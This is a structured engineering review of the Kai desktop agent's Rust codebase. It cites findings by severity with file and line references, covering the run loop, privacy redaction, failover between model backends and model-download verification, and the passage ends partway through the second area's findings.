# Kai — Complete Repository Review (2026-10-16)

> **Purpose.** This document is a full, line-by-line review of the Kai repository as of
> 2026-10-16 (working tree, git HEAD `fc9e63e`). It is written to be handed to a fixing
> agent (human or AI) with no other context: every finding cites exact file locations,
> evidence, impact, and a concrete fix. A separate "Not needed / remove" section per area
> lists code, files, and dependencies that should be deleted or archived.
>
> **How to use this document (fixing agent):** work top-down by severity. Each finding is
> self-contained: `Location` → open the file; `Evidence` → confirms the problem;
> `Fix` → the intended change. After each fix, re-run the tests named in the fix and keep
> the "What's good" sections intact — the good sections exist so that fixes do not
> accidentally regress deliberate, well-made decisions.
>
> **Read-only guarantee.** This review was produced without modifying any source file.
> All changes proposed are suggestions; nothing was applied.

---

## 1. Method

The repository was partitioned into eleven non-overlapping scopes and each scope was swept
by a dedicated review agent. Each agent was instructed to:

1. Read **every file in its scope, in full** — not samples, not grep hits. Coverage is
   attested per area in each "Scope covered" checklist (file, line count, verdict).
2. Assess every file for: correctness, error handling, panics/`unwrap`s on fallible
   paths, resource leaks, blocking I/O on async threads, platform `cfg` correctness,
   security (secrets, injection, path traversal, TOCTOU), races/deadlocks, dead code,
   divergence between sibling modules, and documentation accuracy.
3. Grep exhaustively for `TODO`, `FIXME`, `HACK`, "temporary", and placeholder markers and
   report each with file:line.
4. Classify findings as **CRITICAL / HIGH / MEDIUM / LOW / INFO**
   (CRITICAL = security hole, data loss, crash, or product-breaking bug;
   HIGH = correctness bug, major UX failure, or architecture that blocks iteration;
   MEDIUM = maintainability, moderate UX issue, or test gap;
   LOW = polish/style/docs; INFO = observations and ideas).
5. Record what is **good** with citations, so repairs cannot regress working decisions.
6. Record what is **not needed** — dead, duplicated, superseded, or unused code, files,
   and dependencies — with a justified action (delete, merge, archive, keep-for-now).

A separate pass (agent 8) audited the desktop UI/UX page by page and produced a
**fillers inventory**: every dead control, dummy/hardcoded/sample datum shown as real,
static status pretending to be live, stub page, and "coming soon" affordance, each with
file:line and the fix (wire it to real data or remove it).

## 2. Area map and severity legend

| Area ID   | Scope                                                                 | Fragment |
|-----------|-----------------------------------------------------------------------|----------|
| CORE-ENG  | `kai-core` run loop: engine/*, orchestrator, executor, human, failure, plan | §3.1 |
| CORE-CLI  | `kai-core` model clients (vLLM/Gemini/failover), model catalog & store, settings, MCP, CUA, computer tools, reply/prompt/schema | §3.2 |
| CORE-SAFE | `kai-core` memory, skills, procedures, risk, untrusted content, ledger, trace, shell classifier, task checks | §3.3 |
| OS-PER    | `kai-os` accessibility (3 platforms), capture, Set-of-Marks, input, launcher, shell, kill switch, keychain, permissions | §3.4 |
| OS-WEB    | `kai-os` browser lane (CDP) and local model runtime (download/verify/serve/supervise) | §3.5 |
| CLI       | `kai-cli` commands, bench harness, data export | §3.6 |
| APP-SH    | `kai-app` shell: state, runs, approval, persistence, i18n, local API, windowing | §3.7 |
| APP-UX    | `kai-app` pages + onboarding: visual design, UX flows, consistency, fillers | §3.8 |
| TEST      | All test suites, CI workflows, scripts | §3.9 |
| DOC       | README/DECISIONS/docs accuracy, repo metadata, dependency & license review | §3.10 |
| TBD       | train/ pipeline, bench/ suite, deploy/digitalocean, skills/ | §3.11 |

Severity legend used throughout: **CRITICAL**, **HIGH**, **MEDIUM**, **LOW**, **INFO** as
defined in §1.

## 3. Findings by area

## 3.1 CORE-ENG — Core engine & task lifecycle

*Reviewed files: 31. Findings: 0C / 1H / 4M / 4L / 3I.*

Read-only review of the Kai harness run loop and task lifecycle in `crates/kai-core`. No `cargo` build or test was run; every claim is grounded in a full-file read and cited by line.

### Scope Covered

31 files, 7,743 lines — all read in full (`wc -l` verified).

**`crates/kai-core/src/engine/` — 18 files, 4,176 lines**

- [x] `engine/mod.rs` — 239 lines
- [x] `engine/run.rs` — 163 lines
- [x] `engine/model_step.rs` — 285 lines
- [x] `engine/act.rs` — 454 lines
- [x] `engine/execute.rs` — 360 lines
- [x] `engine/observe.rs` — 421 lines
- [x] `engine/gate.rs` — 265 lines
- [x] `engine/batch.rs` — 179 lines
- [x] `engine/computer.rs` — 281 lines
- [x] `engine/human.rs` — 387 lines
- [x] `engine/privacy.rs` — 173 lines
- [x] `engine/procedure.rs` — 214 lines
- [x] `engine/record.rs` — 218 lines
- [x] `engine/fresh.rs` — 202 lines
- [x] `engine/effect.rs` — 98 lines
- [x] `engine/memory.rs` — 121 lines
- [x] `engine/recover.rs` — 56 lines
- [x] `engine/best_of.rs` — 60 lines

**Top level — 13 files, 3,567 lines**

- [x] `orchestrator.rs` — 495 lines
- [x] `executor.rs` — 324 lines
- [x] `executor_tests.rs` — 161 lines
- [x] `human.rs` — 397 lines
- [x] `human_tests.rs` — 298 lines
- [x] `human_phrases.rs` — 134 lines
- [x] `failure.rs` — 395 lines
- [x] `failure_tests.rs` — 168 lines
- [x] `plan.rs` — 219 lines
- [x] `plan_cache.rs` — 326 lines
- [x] `probe.rs` — 335 lines
- [x] `best_of.rs` — 250 lines
- [x] `lib.rs` — 65 lines

**Marker inventory** — `TODO` / `FIXME` / `HACK` / `temporary` / `placeholder`, case-insensitive, whole-crate scan: **zero hits in any in-scope file**. The only two matches under `crates/kai-core/src/` are out of scope and benign (`models/mod.rs:293` "temporary file" — an atomic-write comment; `memory/recall.rs:230` — the test string `"todo.md - Mousepad"`). Product-facing status: nothing to triage.

Supporting context read for judging (not part of the 31): `ports.rs`, `risk.rs`, `reply.rs`, `reply_salvage.rs`, `prompt.rs`, `computer/dispatch.rs`, `computer/validate.rs`, `DECISIONS.md`, `docs/HUMAN_CHECKS.md`, and consumers `kai-cli/src/main.rs`, `kai-app/src/agent.rs`, `kai-app/src/control.rs`. Out-of-scope lines are cited only where in-scope behaviour depends on them.

### Verdict

The engine is a clean stage pipeline — observe → gate → decide → act → record — over one shared `Run` state, and each extension (executor, deterministic prefix/procedures, best-of, diagnosed recovery, human hand-offs) plugs into that pipeline without bending the core loop. Safety is consistently fail-closed: OS probes in `gate.rs` answer "no" on doubt with a bounded rejection cap, freshness checks are target-scoped, human-check detection runs before every model call on all three action paths, and privacy redaction covers every egress surface (prompt, trace, UI events, memory). Cancellation is real, not decorative: a biased `tokio::select!` races each model call (`record.rs:200-204`) and the e2e test shows a hanging model is still interrupted. **Architecture fit 9/10.**

The serious problem is at the seam to consumers rather than inside the loop: `Report::outcome()` classifies an empty team result set as `Success` (`orchestrator.rs:232-248`), and the CLI exit code trusts exactly that (`kai-cli/src/main.rs:436`). Inside the loop, several failure paths trade model-visible feedback for silence: invalid/stale computer tool calls and swallowed prefix failures end or degrade the run instead of giving the model a repair turn, and two of the three act-error paths stringify the real error to the constant "action failed". None of this leaks data; privacy is aggressive to a fault — typing a user-supplied one-time code permanently kills pixel egress for the run, which overshoots and contradicts what the docs promise. **Correctness 7/10. Security 8/10.**

Tests are unusually strong for this kind of harness: executor gates are argued with escalate-on-doubt cases (`skip_done: 1.01`, `met_ok`/`met_bad`), human-check phrase detection has both positive and negative cases, cancellation has an e2e test against a hanging model, and plan-cache matching is content-token strict. The test gaps line up exactly with the findings below (no empty-team-report test, no prefix-failure feedback, team mode outside recording/learning). Module docs state real invariants ("a sensitive entry permanently disables pixel egress for this run"), so the doc/code mismatches reported here read as drift, not neglect. **Maintainability 8/10. Test coverage 8/10.** Net: a careful, well-structured harness; fix CORE-ENG-01 before trusting team exit codes anywhere.

### Findings

#### [CORE-ENG-01] Team `Report::outcome()` reports `Success` when there are no results

- **Severity:** HIGH
- **Location:** `crates/kai-core/src/orchestrator.rs:232-248`; consumed at `crates/kai-cli/src/main.rs:436` and `crates/kai-app/src/agent.rs:316`
- **What:** `Report::outcome()` returns `Stopped` if any sub-result stopped, `Success` if every sub-result equals `Some(Success)`, else `Failed`. Rust's `Iterator::all` is vacuously true on an empty vector, so a report with **no results at all** is classified `Success`.
- **Evidence:** `orchestrator.rs:232-248`; empty results are reachable — the planner can return zero subtasks and the report is rebuilt by `results.remove(&s.id)` + `filter_map` (`orchestrator.rs:339-349`), which silently yields fewer entries than subtasks. The CLI uses `report.outcome() == Success` as its process exit status (`main.rs:436`).
- **Impact:** a team run that did nothing reports success — exit code 0 for CI/scripts and a success state in the app — with no way to distinguish it from a completed task.
- **Fix:** special-case `results.is_empty()` (return `Failed` or introduce a distinct outcome), keep "any `Stopped` wins" for non-empty sets, and add a unit test constructing an empty `Report`.

#### [CORE-ENG-02] Invalid or stale computer tool calls end the run as `AskedUser`

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/engine/computer.rs:140-145, 170-183`
- **What:** In the `computer_tools_v1` path, a `ToolRequest::validate` failure or a stale/disabled element (`ToolError::StaleObservation`) records an error step and immediately returns `Some(Outcome::AskedUser)`, ending the run instead of returning the error to the model for a repair turn.
- **Evidence:** `computer.rs:140-145` (`request.validate` Err → `AskedUser`); `computer.rs:170-183` (element missing or `!el.enabled` → `StaleObservation` + `AskedUser`); contrast with malformed replies, which get one repair call (`record.rs:152-191`), and with normal act failures, which go back to the model (`model_step.rs:210-219`).
- **Impact:** one hallucinated mark, or a screen that scrolled between observation and action, terminates the whole run and demands a human — even though re-observing would let the model recover. This is exactly the busy-screen case the agent should handle unattended.
- **Fix:** feed the `ToolError` back through the loop (record the step, retry with a fresh observation) and reserve `AskedUser` for repeated stale-action failures or an unusable screen.

#### [CORE-ENG-03] Typing the user's one-time code permanently kills pixel egress; contradicts the docs

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/engine/human.rs:278`; mechanics in `engine/privacy.rs:1, 13-15, 17-35, 127-135`; docs `docs/HUMAN_CHECKS.md:112-114`, `DECISIONS.md:415-419`
- **What:** When the human hands Kai a one-time code, `r.protect(&typing, &obs.grounding, true)` forces the code into `Privacy::secrets`. Since `active()` is `!secrets.is_empty()` and the module's stated design is "a sensitive entry permanently disables pixel egress for this run", every later observation drops its screenshot (`sanitise` → `obs.images.screenshot_jpeg.clear()`). If the screen can only produce `Grounding::Grid`, the next step then ends the run (`model_step.rs:30-32` returns `AskedUser`).
- **Evidence:** `human.rs:278` (`force: true`); `privacy.rs:1` (module doc), `:13-15` (`active`), `:17-35` (`protect` pushes the secret), `:127-135` (`sanitise`); `model_step.rs:30-32`.
- **Impact:** after any OTP hand-off the rest of the run is screenshot-blind even on pages with nothing to hide, and grids become an immediate ask-the-human. This is *more* protective than the documented behaviour — `DECISIONS.md:418-419` and `HUMAN_CHECKS.md:112-114` both say the accepted caveat is that the code may appear in screenshots ("documented, not hidden"). Code and docs contradict each other and at most one is intended.
- **Fix:** decide the policy. Either keep the latch, update both docs, and emit a user-visible event so the loss of vision is explained; or scope redaction to the typing step and blank the code from later element lists/screenshots as the docs describe. Add a test: "after a user-typed code, the next turn still carries a screenshot."
- **Cross-check:** this finding is the code half of a real DECISIONS.md conflict (see cross-check table below).

#### [CORE-ENG-04] Prefix (skill/procedure) act failures are swallowed; only CACHED gets a handover note

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/engine/act.rs:283-287, 310-315`
- **What:** `run_prefix` breaks out of its step loop on any act error, logging a warning and discarding the error value (`let _ = e;`), with no `StepRecord` and no model-visible note; the "already ran" handover note is produced only when `label == CACHED`.
- **Evidence:** `act.rs:283-287` (error swallowed, `break` — the `r.push(rec)` at `:298-301` is never reached for the failed step); `act.rs:310-315` (`if done > 0 && label == CACHED`).
- **Impact:** a SKILL or procedure step that fails leaves no explanation anywhere the model or the user-facing transcript can see. Afterwards `force_full` re-observes (`:317`), so the model cannot even tell that a prefix failed versus never started, and its first action may repeat a broken setup.
- **Fix:** push a note (and a `StepRecord` with `path = "error"`) for every failed prefix step — e.g. "the skill step failed: {e}" — for all labels, not just CACHED.

#### [CORE-ENG-05] Batch and executor paths replace the real act error with "action failed"

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/engine/batch.rs:105-113`; `crates/kai-core/src/engine/execute.rs:278-287`
- **What:** On act failure both paths bind `let _ = e;` then set `e = "action failed"`, so the model-visible feedback is `ERROR: action failed` with no cause — unlike the main model step, which passes the real (privacy-filtered) error string.
- **Evidence:** `batch.rs:105-113`, `execute.rs:278-287` vs `model_step.rs:210-219` (which keeps `e.to_string()`, redacted only to "sensitive action failed" when privacy is active).
- **Impact:** when a batched follow-up or an executor step fails, the model cannot diagnose why, so retries are blind; the trace/transcript loses the OS-level message too, making live debugging harder. Three call sites implementing the same contract three different ways.
- **Fix:** format the real error consistently (`ERROR: {e}` with the same privacy filter) via one shared helper used by all three paths.

#### [CORE-ENG-06] Reply salvage ignores computer-tools mode

- **Severity:** LOW
- **Location:** `crates/kai-core/src/engine/record.rs:145-154, 210-218`
- **What:** The main parse dispatches on `self.config.computer_tools_v1` (`parse_computer` vs `parse_with_focus`), but `salvaged()` hardcodes `StepReply::parse_with_focus`. With computer tools enabled, a reply cut off inside `then` can never take the cheap salvage path and instead costs a second (repair) model call.
- **Evidence:** `record.rs:145-151` (mode dispatch), `:152-154` (salvage guard), `:210-218` (`salvage_cut_then` + `parse_with_focus`).
- **Impact:** extra latency and tokens per truncated computer-mode reply; the salvage feature silently doesn't apply to one of the two schema modes.
- **Fix:** parameterise `salvaged()` by mode (mirror the `parse` closure) so the fixed text is parsed by the selected parser.

#### [CORE-ENG-07] No-progress warning text mismatches its trigger

- **Severity:** LOW
- **Location:** `crates/kai-core/src/prompt.rs:202-207`; trigger at `crates/kai-core/src/engine/model_step.rs:62`
- **What:** The warning says "the screen has not changed for two steps", but `no_progress` is set when `no_progress_streak >= 1` — i.e. after a single unchanged step.
- **Evidence:** `prompt.rs:202-207` ("not changed for two steps") vs `model_step.rs:62` (`no_progress: r.no_progress_streak >= 1`).
- **Impact:** the model is told something untrue about its own history on the first stalled step, which can push it to abandon a working approach early.
- **Fix:** either raise the trigger to `>= 2` or reword the warning to match the actual threshold.

#### [CORE-ENG-08] Blocking filesystem I/O inside the async run loop

- **Severity:** LOW
- **Location:** `crates/kai-core/src/engine/record.rs:65-80` (wrap_up: recorder finish `:66-70`, plan-cache write `:73-78`, procedure store `:79`), `plan_cache.rs:126-129` (`std::fs::write`), `engine/memory.rs:76-93` (`store.after_run`, sync), `prompt.rs:147` (`std::fs::canonicalize` on every turn with an active skill)
- **What:** Synchronous filesystem calls run directly on the async runtime inside `run_with`, with no `spawn_blocking`/`tokio::fs`.
- **Evidence:** as cited above (`wrap_up` → `cache.record` → `std::fs::write`; `learn_from` calls the sync `after_run`; `canonicalize` in `build_turn`).
- **Impact:** under team mode, several sub-agents plus UI heartbeats share one runtime; a slow write can stall peers. The per-turn `canonicalize` also pays a syscall every step of a skill run for an answer that cannot change mid-run.
- **Fix:** wrap writes in `tokio::task::spawn_blocking` (or use `tokio::fs`) and cache the canonicalised skill directory per run.

#### [CORE-ENG-09] Best-of planning fan-out is not cost-accounted

- **Severity:** LOW
- **Location:** `crates/kai-core/src/engine/best_of.rs:40-58`
- **What:** Up to `MAX_SAMPLES` parallel planning calls are awaited and parsed, but no usage/token accounting is recorded anywhere; failures are logged and dropped.
- **Evidence:** `engine/best_of.rs:40-48` (`join_all` over `decide`, then `parse`) — no `add_usage`/ledger call in the file; `r.trace.best_of` stores only scores/notes (`:56-57`).
- **Impact:** traces and any cost telemetry undercount plan-phase spend by up to a factor of N — and the fan-out is the most token-heavy phase of a long run.
- **Fix:** accumulate token usage from each `ModelReply` into the trace (mirroring `Decided::add_usage`) and record the candidate count.

#### [CORE-ENG-10] A fresh `Dispatcher` per computer step resets dispatch guard state

- **Severity:** INFO
- **Location:** `crates/kai-core/src/engine/computer.rs:247`; guard in `crates/kai-core/src/computer/dispatch.rs:83, 100-118`
- **What:** Every computer step builds `Dispatcher::new(&executor, &Authorized, self.interrupt)`; the dispatcher's replay/owner guard (`owner: Mutex<Option<(session, id)>>`, checked at `dispatch.rs:109-118`) exists only for that dispatcher's lifetime. The global `MUTATION_OWNER` lock is held inside the dispatch future (`:105`).
- **Evidence:** `computer.rs:247`; `dispatch.rs:83, 100-118`; the cancellation note at `:133-135`.
- **Impact:** any ordering/replay invariant that would need to span steps cannot be enforced by this guard — it is per-step by construction. Today that appears intentional and benign, but it is an implicit invariant a future change could easily violate.
- **Fix:** add a comment stating the per-step lifetime, or hoist the dispatcher into run state if cross-step guarding is ever required.

#### [CORE-ENG-11] Deadline is enforced only in the model loop; prefix approvals only for CACHED

- **Severity:** INFO
- **Location:** `crates/kai-core/src/engine/mod.rs:205-216` (deadline check at `:210-212`); `crates/kai-core/src/engine/act.rs:272-278` (approval gate only when `label == CACHED`)
- **What:** The time limit is checked inside the model-step loop only. Deterministic prefix steps (`run_prefix`), procedures and the executor loop have no equivalent check. The prefix's approval gate runs only for CACHED steps; SKILL/procedure steps execute without approval (presumably by design).
- **Evidence:** `mod.rs:210-212`; `act.rs:272-278`.
- **Impact:** a hung skill or long procedure can exceed the configured run budget; approval coverage is narrower than a casual reader would assume. Both look deliberate but are undocumented.
- **Fix:** check the deadline before each prefix/executor step and document (or gate) the no-approval stance for skill steps.

#### [CORE-ENG-12] Team mode ignores recording, memory and plan reuse; no trace is saved

- **Severity:** INFO
- **Location:** `crates/kai-core/src/orchestrator.rs:321, 325` (sub-agents via `Engine::run`), `crates/kai-core/src/engine/mod.rs:126-127` (`run` → `RunOptions::default()`), `crates/kai-cli/src/main.rs:413-436`
- **What:** Sub-agents are launched with `Engine::run`, which uses `RunOptions::default()`: no recorder, no plan cache, no procedure store, no memory learning. The CLI team branch never calls `memory::save_trace` or `recorder.finish` (contrast the non-team branch at `main.rs:408-411`), so `--record` produces nothing for team runs — only the summary text is returned.
- **Evidence:** `orchestrator.rs:321, 325, 352-372` (sub-engine built with `outcomes: false`, no options threaded); `mod.rs:126-127`; `main.rs:413-436`.
- **Impact:** team runs — the default for larger tasks (`DECISIONS.md:752`) — are invisible to recording and learning tooling; users who enable `--record` silently get no data, and repeated team tasks cannot reuse plan-cache prefixes.
- **Fix:** thread the parent `RunOptions` (or at least the recorder) into sub-agents, or make the CLI state explicitly that team runs are not recorded and why.

#### DECISIONS.md cross-check

- **CONFLICT — one-time code vs screenshots (CORE-ENG-03).** `DECISIONS.md:415-419` ("Screenshots can still show a code while it is on the page; documented, not hidden") and `docs/HUMAN_CHECKS.md:112-114` (the "Caveat, stated plainly" that the code is in the screenshot) describe leaving screenshots on; `engine/human.rs:278` + `engine/privacy.rs:1,127-135` permanently disable them after the code is typed. At most one of these is intended.
- **DIVERGENCE — recording promise (CORE-ENG-12).** `DECISIONS.md:378-380` states `kai run --record` saves training data; the team branch neither finishes a recorder nor saves a trace (`main.rs:413-436`) and sub-agents run with defaults (`mod.rs:126-127`).
- **ALIGNED — checked, no conflict:** sub-agents receive `NoSteering` (`DECISIONS.md:315-316` ↔ `main.rs:422`); the split rule "kept only for two or more terminal subtasks" (`DECISIONS.md:752-756` ↔ `orchestrator.rs:62-73`, test `a_split_is_kept_only_for_parallel_terminal_work` at `:466`); the approval/human-check queueing fix (`DECISIONS.md:741-745`).

### Not Needed / Remove

No dead files or unreferenced stubs were found in scope; nothing warrants outright deletion from this read. Consolidation/removal candidates, all tied to findings above:

- **Remove the duplicated error-swallowing block** at `batch.rs:107-113` and `execute.rs:280-287`; replacing both with the `model_step.rs:210-219` formatting (one shared helper) deletes the duplication and CORE-ENG-05 together.
- **Drop the per-turn `std::fs::canonicalize`** at `prompt.rs:147` in favour of a per-run cached path (CORE-ENG-08).
- **Unify parser selection**: `salvaged()` (`record.rs:210-218`) should take the mode rather than hardcoding a second parse policy (CORE-ENG-06).
- **The per-step `Dispatcher::new`** (`computer.rs:247`) is removable only if cross-step replay guarding is provably unnecessary; one comment stating the per-step lifetime settles it either way (CORE-ENG-10).

### What's Good

- **`engine/fresh.rs`** — freshness checks are target-scoped: an old screen cannot be mistaken for a new one before an action is judged safe to perform.
- **`engine/act.rs`** — `reopen_guard`, repeat/loop/cycle guards prevent self-inflicted loops, and they are applied on every action path (model step, batch, executor).
- **`human.rs` + `human_phrases.rs`** — whole-word phrase detection with both positive and negative tests (no false pause on "postal code" / reCAPTCHA badges); one-time codes have no `Serialize` and a `Debug` that prints `[one-time code]`; redaction runs inside `look` and the batch re-check.
- **`engine/gate.rs`** — OS probes fail closed and `MAX_GATE_REJECTIONS` bounds retry storms.
- **`executor.rs`** — escalate-on-doubt gates with argumented tests (`skip_done: 1.01`, `met_ok`/`met_bad`): verification is a first-class concern, not an afterthought.
- **`plan_cache.rs`** — content-token-strict matching means a cached plan replays only for a genuinely matching task.
- **`probe.rs`** — regex size limit and `MAX_ARG` cap keep OS probes bounded.
- **`engine/batch.rs`** — every follow-up re-checks human/sensitive guards before acting, so batched `then` cannot bypass checks.
- **Cancellation end-to-end** — biased `select!` + `wait_cancelled` + e2e test against a hanging model (`tests/cancellation_e2e.rs`); queued driver work cannot run after cancellation (`dispatch.rs:133-135`).
- **Hygiene** — zero TODO/FIXME/HACK markers across 7,743 lines; module docs state real invariants (e.g. privacy's "permanently disables pixel egress", dispatch's cancellation note).

### Open Questions

1. Is the permanent pixel-egress latch after a user-typed OTP the intended policy (the docs say otherwise), or should redaction be scoped to the typing step? (CORE-ENG-03)
2. Should team runs honour `--record`, memory and plan cache — or is running sub-agents with default options a deliberate resource choice that should be documented and surfaced in the CLI output? (CORE-ENG-12)
3. Is ending the run with `AskedUser` on the first invalid/stale computer action intended, or should the model get a repair turn with a fresh observation? (CORE-ENG-02)
4. Should SKILL/procedure prefix steps be covered by the run deadline and (under high-risk approval settings) by the approver? (CORE-ENG-11)

---

## 3.2 CORE-CLI — Model clients, catalog, settings, MCP, computer tools

*Reviewed files: 36. Findings: 0C / 1H / 2M / 6L / 2I.*

### Scope covered

Read-only review. Every file below was read in full, line by line, and line counts
are from `wc -l` on the current tree. Cross-checks (not in the checklist, read to
confirm or refute findings): `kai-core/src/risk.rs`, `untrusted.rs`, `probe.rs`,
`ports.rs`, `engine/model_step.rs`, `engine/record.rs`, `kai-cli/src/mcp.rs`,
`kai-os/src/local/{mod,download}.rs`, `models/catalog.json`, `README.md`,
`DECISIONS.md` and `docs/{MODEL_STORE,MCP,COMPUTER_TOOLS,HARNESS,LOCAL_MODELS}.md`.

#### client/ (2,550 lines)
- `crates/kai-core/src/client/mod.rs` — 193 — ClientError/`is_failover`/shared HTTP client are cleanly factored; `is_failover` misses 429 (finding CORE-CLI-01).
- `crates/kai-core/src/client/openai.rs` — 471 — careful 429 Retry-After loop and 400 reasoning/schema step-downs; `strictify` is sound; no findings.
- `crates/kai-core/src/client/gemini.rs` — 394 — per-key rotation, quoted retry waits, retry-and-remember for thinkingConfig/responseJsonSchema; drifts from DECISIONS.md on the thinking level (CORE-CLI-04).
- `crates/kai-core/src/client/vllm.rs` — 209 — minimal one-shot client; no 429/5xx retry and not wired into failover classes (CORE-CLI-01); builds its own HTTP client without `SSL_CERT_FILE` roots (CORE-CLI-10).
- `crates/kai-core/src/client/failover.rs` — 188 — cooldown + 365-day "stay on secondary" behaviour is deliberate and tested; Mutex `unwrap()`s noted (CORE-CLI-10).
- `crates/kai-core/src/client/mock.rs` — 128 — small deterministic test backend; nothing to change.
- `crates/kai-core/src/client/stream.rs` — 234 — SSE reader with usage/cost extraction and early stop; robust to trailing data; no findings.
- `crates/kai-core/src/client/llm_verifier.rs` — 121 — optional judge client, off by default per DECISIONS.md; fine.
- `crates/kai-core/src/client/jev.rs` — 375 — JEV backend with the same schema/validation discipline; no findings.
- `crates/kai-core/src/client/jev_answer.rs` — 237 — answer-side request/response handling for JEV; no findings.

#### models/ (1,525 lines)
- `crates/kai-core/src/models/mod.rs` — 442 — catalog merge/user overlay and `problems()` are clear; `problems()` does not require sha256/size, which pulls can omit (CORE-CLI-02); `save_user_entry` already uses write-tmp+rename.
- `crates/kai-core/src/models/hub.rs` — 371 — ref parsing, whole-token quant matching, gated/split/text-only refusals are solid; LFS hash/size are optional and never enforced (CORE-CLI-02).
- `crates/kai-core/src/models/hub_tests.rs` — 239 — anchored to real Hub JSON shapes; good.
- `crates/kai-core/src/models/rank.rs` — 241 — "Best" only for measured (`computer_use_rank>0`) models, macOS unified memory handled; good.
- `crates/kai-core/src/models/rank_tests.rs` — 232 — hardware-profile table tests; good.

#### settings, MCP, cua, computer (2,081 lines)
- `crates/kai-core/src/settings.rs` — 448 — backend chain (vLLM → Gemini → Gateway) is readable; non-atomic save + silent defaults on load (CORE-CLI-03) and relative-path fallback in `dir()` (CORE-CLI-08).
- `crates/kai-core/src/settings_tests.rs` — 189 — env/merge coverage; no save/load durability test.
- `crates/kai-core/src/mcp.rs` — 435 — tool surface is well governed; `initialize` echoes the client's protocolVersion (CORE-CLI-07).
- `crates/kai-core/src/cua.rs` — 189 — runner/session glue; no findings.
- `crates/kai-core/src/cua_protocol.rs` — 205 — strict whitelist, per-action arg checks, 4-action cap; `unreachable!()` at :199 is guarded (CORE-CLI-11).
- `crates/kai-core/src/cua/mapping.rs` — 129 — legacy adapter; dead back/forward arms (CORE-CLI-05) and swallowed `validate_and_clamp` errors (CORE-CLI-06).
- `crates/kai-core/src/cua/provider.rs` — 290 — provider/observation abstraction is consistent with the shared dispatch; no findings.
- `crates/kai-core/src/computer/action.rs` — 156 — action enum + serde bounds; no findings.
- `crates/kai-core/src/computer/dispatch.rs` — 183 — ownership/mutation-owner semantics look correct; no findings.
- `crates/kai-core/src/computer/mod.rs` — 81 — module glue; no findings.
- `crates/kai-core/src/computer/schema.rs` — 74 — capability-derived tool schema; no findings.
- `crates/kai-core/src/computer/validate.rs` — 161 — text/keys/scroll/wait bounds enforced as documented; good.

#### schema, reply, prompt, element, memo, web (1,882 lines)
- `crates/kai-core/src/schema.rs` — 387 — quote-aware balanced `extract_json_object`; clamping rejects only missing required fields; good.
- `crates/kai-core/src/reply.rs` — 465 — parse → salvage → validate pipeline is layered and deliberate; good.
- `crates/kai-core/src/reply_salvage.rs` — 162 — conservative salvage that still requires a complete `risk`; good.
- `crates/kai-core/src/prompt.rs` — 337 — stable-first prompt layout with injection rules; good.
- `crates/kai-core/src/prompt_tests.rs` — 195 — layout/rule regression tests; good.
- `crates/kai-core/src/element.rs` — 374 — mark/element list handling verified against schema/clamps; good.
- `crates/kai-core/src/memo.rs` — 120 — lesson storage is local-only and small; no findings.
- `crates/kai-core/src/web.rs` — 179 — URL normalisation and `>>>page` fence escaping look correct; good.

### Verdict

This is a careful, well-documented model layer: the request paths validate and clamp every
field, backends fail over through one composed trait object, and the reply side layers
salvage → validate → clamp so a sloppy model answer degrades instead of crashing. I found
no crashes, no injection path, and no data-corrupting bug in the hot path. The two real
weaknesses are integration-level: the Droplet client is the only backend with no 429
handling and its errors are explicitly excluded from the failover classes, so a
rate-limited primary drops the step even when Gemini/Gateway are configured; and pulled
Hub entries are not required to carry the SHA-256/size that the module doc and
`docs/MODEL_STORE.md` promise, so `kai models pull` can install unverified weights. Both
are small, testable fixes.

Scores: **correctness 7/10** — parsing, clamping, stream reading, failover cooldowns and
schema step-downs are correct and measured; the vLLM/429 gap and the legacy-mapping
latent invalid `Decision` are the deductions. **security 7/10** — https-only catalog,
checksum verification when a hash exists, high-risk/payment/CAPTCHA refusals in MCP,
untrusted-text detection, and never echoing control characters; the hash-optional pull
path and silent settings reset are the deductions. **maintainability 8/10** — small
modules, strong doc comments, tests anchored to real JSON shapes; dead code and
README/DECISIONS drift cost points. **test coverage 8/10** — hub/rank/settings/openai/
gemini/cua tests are substantive; missing: vLLM retry, mapping missing-text, settings
save/load durability, and a "429 on primary falls through the chain" test.
**architecture fit 9/10** — `ModelClient` + `FailoverClient` + ports/engine separation is
coherent, and `BackendChoice::Both` composing nested failover clients is elegant; the
legacy mapping module sitting beside the versioned protocol is the only wart.

### Findings

#### [CORE-CLI-01] Droplet (vLLM) 429s fail the step instead of retrying or failing over
- **Severity:** HIGH
- **Location:** `crates/kai-core/src/client/vllm.rs:111-127`, `crates/kai-core/src/client/mod.rs:111-122`, `crates/kai-core/src/settings.rs:393-421`
- **What:** `VllmClient::decide` sends exactly one request and returns `ClientError::from_status(429, ...)` on a rate limit. Unlike `openai.rs` (waits out 429 up to 8 times) and `gemini.rs` (rotates keys and waits), the Droplet path has no retry, and `ClientError::is_failover()` excludes `Status(429)`, so the `Both` chain (vLLM → Gemini → Gateway) does not fall through either: the error reaches the engine, which counts a model failure (default `max_failures` = 3) and can end the run as `AskedUser`. DECISIONS.md records the Gateway's 429-wait behaviour (line 274) but no Droplet 429 policy, so this is not deliberate design.
- **Evidence:**
  ```rust
  // vllm.rs:124-127
  if !status.is_success() {
      let txt = resp.text().await.unwrap_or_default();
      return Err(ClientError::from_status(status.as_u16(), &txt));
  }
  // mod.rs:117-120
  ClientError::Transport(_) | ClientError::Timeout(_)
      | ClientError::Status(500..=599, _) | ClientError::Unavailable(_)
  ```
- **Impact:** a transient 429 from the Droplet (nginx/DO proxy or vLLM queueing) drops a step even though two healthy fallbacks are configured; `--backend vllm` alone has no fallback, so it fails outright. Three consecutive failures end the run with an `AskedUser` outcome instead of continuing.
- **Fix:** port the 429 loop from `openai.rs` into `VllmClient::decide` (Retry-After, cap 60 s, `MAX_RATE_LIMIT_TRIES`), and/or treat `Status(429, _)` as failover-class in `ClientError::is_failover`. Tests: a mock server answering 429 once then 200 asserts the step succeeds; a `FailoverClient` chain test asserts a 429 on the primary reaches the secondary.

#### [CORE-CLI-02] Pulled Hub entries may carry no sha256/size; install then downloads unverified
- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/models/hub.rs:76-102,219-224`, `crates/kai-core/src/models/mod.rs:120-156,397-401`
